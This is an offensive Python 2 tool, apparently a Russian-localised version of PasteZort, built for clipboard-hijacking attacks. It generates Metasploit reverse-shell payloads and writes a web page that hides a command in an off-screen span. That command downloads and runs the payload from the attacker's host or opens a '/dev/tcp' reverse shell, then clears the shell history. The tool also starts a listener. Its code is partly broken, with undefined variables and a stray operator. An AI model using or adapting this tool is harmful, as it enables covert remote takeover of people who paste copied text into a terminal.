#!/usr/bin/python
#-*- coding: utf-8 -*-
##############################################################################
# Создал:ZettaHack
# Ссылка: https://github.com/ZettaHack/PasteZort.git
# Контакт: https://www.facebook.com/ZettaHack-568599933346788/
#           zettahackz@gmail.com
#
#           antonlinux@yandex.ru
##############################################################################


import os
import subprocess
import atexit

def Windows():

		print'\033[0;31m'+"""\n-------------------------------------------------------------------
 -> Конфигурация полезной нагрузки:
-------------------------------------------------------------------"""
		print '\033[0;39m'

		NombreIndex = "index.html"
		NombreHandlerConfig="Handler_Metasploit"
		if os.path.isfile(NombreIndex):
			os.system("rm index.html")
		if os.path.isfile(NombreHandlerConfig):
			os.system("rm Handler_Metasploit")

		payload_seleccionado=int(raw_input("""   Выбери нагрузку:
   [1] windows/meterpreter/reverse_tcp
   [2] windows/meterpreter/reverse_http
   [3] windows/meterpreter/reverse_https
   [4] windows/shell/reverse_tcp
   Payload: """))

		if (payload_seleccionado == 1):
			payload="windows/meterpreter/reverse_tcp"
		elif (payload_seleccionado == 2):
			payload="windows/meterpreter/reverse_http"
		elif (payload_seleccionado == 3):
			payload="windows/meterpreter/reverse_https"
		elif (payload_seleccionado == 4):
			payload="windows/shell/reverse_tcp"
		else:
			print '\033[1;31m'+"Что-то не получилось создать!"



		ip=raw_input("\n   LHOST= ")
		port=raw_input("   LPORT= ")

		print '\033[1;31m'+"""\n-------------------------------------------------------------------
 -> Создаю нагрузку...
-------------------------------------------------------------------"""
		print '\033[0;39m'
		proc = subprocess.Popen(["./encode.rb -i "+ip+" -p "+port+" -a "+payload+" -t cmd"], stdout=subprocess.PIPE, shell=True)
		(out, err) = proc.communicate()
		print '\033[1;31m'+"""\n-------------------------------------------------------------------
 -> Нагрузка создана!
-------------------------------------------------------------------"""
		print '\033[0;39m'
		Msg=raw_input("   Mensaje 1: ")		
		Msg=raw_input("   Mensaje 2: ")
		index="index.html"
		job=open(index,"w")	
		job.write("""<p> """+ mensaje1 + """ <span style="position: absolute; left: -2000; top: -100px;" >c:\ & cls & """+out+""" & c:\ & cls <br> """ + mensaje1 + """ </span> """ + mensaje2 + """ </p> """)
		job.close()

		print '\033[1;31m'+"""\n-------------------------------------------------------------------
 -> Введи эти команды в терминал или cmd(какие? смотри на ютуб)"""

		NombreIndex="index.html"
		if os.path.isfile(NombreIndex):
			os.system("rm /var/www/html/index.html")
			os.system("cp index.html /var/www/html")
			print '\033[1;31m'+"""-------------------------------------------------------------------
 -> Что-то не смог перевести )))
-------------------------------------------------------------------"""
		else:
			os.system("cp index.html /var/www/html")
			print"""-------------------------------------------------------------------
 -> Что-то не смог перевести )))
-------------------------------------------------------------------"""
 		print""" -> URL: http://"""+ip+"""/
-------------------------------------------------------------------"""
		documento="Handler_Metasploit"
		archivo = open(documento,"w")
		archivo.write("""use multi/handler
set payload """+payload+"""
set lhost """+ip+"""
set lport """+port+"""
set exitonsession false
exploit -j""")
		archivo.close()
		print '\033[0;39m'
		iniciar_handler=str(raw_input("   Согласен с правилами? (y/n): "))
		if (iniciar_handler == 'y'):
			print '\033[1;31m'+"""\n-------------------------------------------------------------------
 -> Создание(или запуск) handler Metasploit...
-------------------------------------------------------------------"""
			print '\033[0;39m'
			os.system("msfconsole -r Handler_Metasploit")
		elif (iniciar_handler == 'n'):
			print "\n   Все ок!\n"
def Linux():
		print'\033[0;31m'+"""\n-------------------------------------------------------------------
 -> Конфигурация полезной нагрузки:
-------------------------------------------------------------------"""
		print '\033[0;39m'
		NombrePayload = "payload.elf"
		NombreIndex="index.html"
		if os.path.isfile(NombrePayload):
			os.system("rm /var/www/html/payload.elf")
		if os.path.isfile(NombreIndex):
			os.system("rm /var/www/html/index.html")
		payload_seleccionado=int(raw_input("""   Выбери нагрузку:
   [1] linux/x86/meterpreter/reverse_tcp
   [2] linux/x86/shell/reverse_tcp
   [3] linux/x64/shell/reverse_tcp
   Payload: """))

		if (payload_seleccionado == 1):
			payload="linux/x86/meterpreter/reverse_tcp"
		elif (payload_seleccionado == 2):
			payload="linux/x86/shell/reverse_tcp"
		elif (payload_seleccionado == 3):
			payload="linux/x64/shell/reverse_tcp"

		else:
			print '\033[1;31m'+"Что-то не так!"
		ip=raw_input("\n   LHOST= ")
		port=raw_input("   LPORT= ")

		print '\033[1;31m'+"""\n-------------------------------------------------------------------
 -> Создание нагрузки...
-------------------------------------------------------------------"""
		print '\033[0;39m'
		os.system("msfvenom -p "+payload+" LHOST=" + ip + " LPORT=" + port + " -f elf > /var/www/html/payload.elf")
		
		print '\033[1;31m'+"""-------------------------------------------------------------------
 -> нагрузка создана!
-------------------------------------------------------------------"""
		print '\033[0;39m'
		Msg=raw_input("   Mensaje 1: ")
		Msg=raw_input("   Mensaje 2: ")
		NombreIndex="index.html"
		job=open(NombreIndex,"w")	
		job.write("""<p> """ + mensaje1 + """ <span style="position: absolute; left: -2000; top: -100px;" >/dev/null; clear; wget http://"""+ip+"""/payload.elf &> /dev/null && chmod +x ./payload.elf && ./payload.elf & disown && clear <br> """ + mensaje1 + """ </span> """ + mensaje2 + """ </p>""")
		job.close()

		print '\033[1;31m'+"""\n-------------------------------------------------------------------
 -> Не понял)))"""

		if os.path.isfile("/var/www/html/index.html"):
			os.system("rm /var/www/html/index.html")
			os.system("cp index.html /var/www/html")
			print '\033[1;31m'+"""-------------------------------------------------------------------
 -> Тут так же
-------------------------------------------------------------------"""
		else:
			os.system("cp index.html /var/www/html")
			print"""-------------------------------------------------------------------
 -> Archivo index.html copiado en servidor local
-------------------------------------------------------------------"""
 		print""" -> URL: http://"""+ip+"""/
-------------------------------------------------------------------"""
		documento="Handler_msf_Linux"
		archivo = open(documento,"w")
		archivo.write("""use multi/handler
set payload """+payload+"""
set LHOST """ + ip + """
set LPORT """ + port + """
set ExitOnSession false
exploit -j""")
		archivo.close()

		print '\033[0;39m'
		iniciar_handler=str(raw_input("   С правилами согласен? (y/n): "))
		if (iniciar_handler == 'y'):
			print '\033[1;31m'+"""\n-------------------------------------------------------------------
 ->  Создание(или запуск) handler Metasploit...
-------------------------------------------------------------------"""
			print '\033[0;39m'
			os.system("msfconsole -r Handler_msf_Linux")
		elif (iniciar_handler == 'n'):
			print "\n   Готово!\n"
def MacOSX():
		global payload
		global formato
		global extension
		global ejecucion
		ejecucion="./"
		print'\033[0;31m'+"""\n-------------------------------------------------------------------
 -> Конфигурация полезной нагрузки:
-------------------------------------------------------------------"""
		print '\033[0;39m'
		NombreIndex="index.html"
		
		if os.path.isfile(NombreIndex):
			os.system("rm /var/www/html/index.html")
		
		payload_seleccionado=int(raw_input("""   Выбери нагрузку:
   [1] reverse shell netcat
   [2] osx/x86/shell_reverse_tcp
   [3] java/meterpreter/reverse_tcp
   [4] python/meterpreter/reverse_tcp
   Payload: """))

		if (payload_seleccionado == 1):
			NetcatMacOSX()
		elif (payload_seleccionado == 2):
			payload="osx/x86/shell_reverse_tcp"
			formato="macho"
			extension="macho"
			ShellMacOSX()
		elif (payload_seleccionado == 3):
			payload="java/meterpreter/reverse_tcp"
			formato="jar"
			extension="jar"
			ejecucion="java -jar "
			ShellMacOSX()
		elif (payload_seleccionado == 4):
			payload="python/meterpreter/reverse_tcp"
			formato="raw"
			extension="py"
			ejecucion="python "
			ShellMacOSX()
		else:
			print '\033[1;31m'+"Упс! Что-то не так!"
def NetcatMacOSX():
			ip=raw_input("\n   LHOST= ")
			port=raw_input("   LPORT= ")

			print '\033[1;31m'+"""\n-------------------------------------------------------------------
 -> Создание нагрузки...
-------------------------------------------------------------------"""
			print '\033[0;39m'

		
			print '\033[1;31m'+"""-------------------------------------------------------------------
 -> Создано!
-------------------------------------------------------------------"""
			print '\033[0;39m'
			Msg=raw_input("   Mensaje 1: ")
			Msg=raw_input("   Mensaje 2: ")
			#comando=raw_input("   Comando: ")

			NombreIndex="index.html"
			job=open(NombreIndex,"w")	
##/bin/bash 0"""+"""<"""+"""/dev/tcp/"""+ip+"""/"""+port+""" 1>&0 2>&0 & clear; clear
			job.write("""<p> """ + mensaje1 + """\n <span style="position: absolute; left: -2000; top: -100px;" >;/bin/bash -i >& /dev/tcp/"""+ip+"""/"""+port+""" 0>&1 & clear; clear; history -c <br> """ + mensaje1 + """ </span> """ + mensaje2 + """ </p>""")
			job.close()

			print '\033[1;31m'+"""\n-------------------------------------------------------------------
 -> Не фига не понимаю!"""

			if os.path.isfile("/var/www/html/index.html"):
				os.system("rm /var/www/html/index.html")
				os.system("cp index.html /var/www/html")
				print '\033[1;31m'+"""-------------------------------------------------------------------
 -> :)
-------------------------------------------------------------------"""
			else:
				os.system("cp index.html /var/www/html")
				print"""-------------------------------------------------------------------
 -> :/
-------------------------------------------------------------------"""
 			print""" -> URL: http://"""+ip+"""/
-------------------------------------------------------------------"""
			print '\033[0;39m'
			iniciar_handler=str(raw_input("   Согласен с правилами? (y/n): "))
			if (iniciar_handler == 'y'):
				print '\033[1;31m'+"""\n-------------------------------------------------------------------
 -> Что-то делаем...
-------------------------------------------------------------------"""
				print '\033[0;39m'
				os.system("nc -lvp "+port)
			elif (iniciar_handler == 'n'):
				print "\n   Готово!\n"
def ShellMacOSX():
			print'\033[0;31m'+"""\n-------------------------------------------------------------------
 -> Конфигурация нагрузки:
-------------------------------------------------------------------"""
			print '\033[0;39m'
			NombrePayload = "osx."+extension
			NombreIndex="index.html"
			if os.path.isfile(NombrePayload):
				os.system("rm /var/www/html/osx."+extension)
			if os.path.isfile(NombreIndex):
				os.system("rm /var/www/html/index.html")
		
			ip=raw_input("\n   LHOST= ")
			port=raw_input("   LPORT= ")

			print '\033[1;31m'+"""\n-------------------------------------------------------------------
 -> Создание...
-------------------------------------------------------------------"""
			print '\033[0;39m'
			os.system("msfvenom -p "+payload+" LHOST=" + ip + " LPORT=" + port + " -f "+formato+" > /var/www/html/osx."+extension)
			
			print '\033[1;31m'+"""-------------------------------------------------------------------
 -> Готово! : """+payload+"""
-------------------------------------------------------------------"""
			print '\033[0;39m'
			Msg=raw_input("   Mensaje 1: ")
			Msg=raw_input("   Mensaje 2: ")
			NombreIndex="index.html"
			job=open(NombreIndex,"w")	
			job.write("""<p> """ + mensaje1 + """ <span style="position: absolute; left: -2000; top: -100px;" >;curl -O http://"""+ip+"""/osx."""+extension+""";chmod +x osx."""+extension+""";"""+ejecucion+"""osx."""+extension+""" & history -c;clear <br> """ + mensaje1 + """ </span> """ + mensaje2 + """ </p>""")
			job.close()

			print '\033[1;31m'+"""\n-------------------------------------------------------------------
 -> Ничего не скажу"""

			if os.path.isfile("/var/www/html/index.html"):
				os.system("rm /var/www/html/index.html")
				os.system("cp index.html /var/www/html")
				print '\033[1;31m'+"""-------------------------------------------------------------------
 -> ...
-------------------------------------------------------------------"""
			else:
				os.system("cp index.html /var/www/html")
				print"""-------------------------------------------------------------------
 -> !...!
-------------------------------------------------------------------"""
 			print""" -> URL: http://"""+ip+"""/
-------------------------------------------------------------------"""
			documento="Handler_msf_MacOSX"
			archivo = open(documento,"w")
			archivo.write("""use multi/handler
set payload """+payload+"""
set LHOST """ + ip + """
set LPORT """ + port + """
set ExitOnSession false
exploit -j""")
			archivo.close()

			print '\033[0;39m'
			iniciar_handler=str(raw_input("   Согласен с правилами? (y/n): "))
			if (iniciar_handler == 'y'):
				print '\033[1;31m'+"""\n-------------------------------------------------------------------
 -> Что-то делаем с handler Metasploit...
-------------------------------------------------------------------"""
				print '\033[0;39m'
				os.system("msfconsole -r Handler_msf_MacOSX")
			elif (iniciar_handler == 'n'):
				print "\n   Готово!\n"
os.system("clear")
print """ _________________________________________________________________
| --------------------------------------------------------------- |
||            ____           _       _____          _            ||
||           |  _ \ __ _ ___| |_ ___|__  /___  _ __| |_          ||
||           | |_) / _` / __| __/ _ \ / // _ \| '__| __|         ||
||           |  __/ (_| \__ \ ||  __// /| (_) | |  | |_          ||
||           |_|   \__,_|___/\__\___/____\___/|_|   \__|         ||
||                           -----------                         ||
||            rusVer         |v| |1|.|0|         rusVer          ||
||                           -----------                         ||
||           ______    _   _        _    _            _          ||
||          |___  /   | | | |      | |  | |          | |         ||
||             / / ___| |_| |_ __ _| |__| | __ _  ___| | __      ||
||            / / / _ \ __| __/ _` |  __  |/ _` |/ __| |/ /      ||
||           / /_|  __/ |_| || (_| | |  | | (_| | (__|   <       ||
||          /_____\___|\__|\__\__,_|_|  |_|\__,_|\___|_|\_\      ||
||                                                               ||
| --------------------------------------------------------------- |
|_________________________________________________________________|
"""
print'\033[1;31m'+"""-------------------------------------------------------------------
 -> Привет!:
-------------------------------------------------------------------"""
+os.system("service apache2 start")

print """ -> Как дела?
-------------------------------------------------------------------"""
print '\033[0;39m'
OS_Objetivo=int(raw_input("""   Выбор ос:
   [1] Windows
   [2] Linux
   [3] Mac OSX
   Objetivo: """))

if (OS_Objetivo == 1):
	Windows()
elif (OS_Objetivo == 2):
	Linux()
elif (OS_Objetivo == 3):
	MacOSX()
else:
	print '\033[1;31m'+"Чета тут не так!"
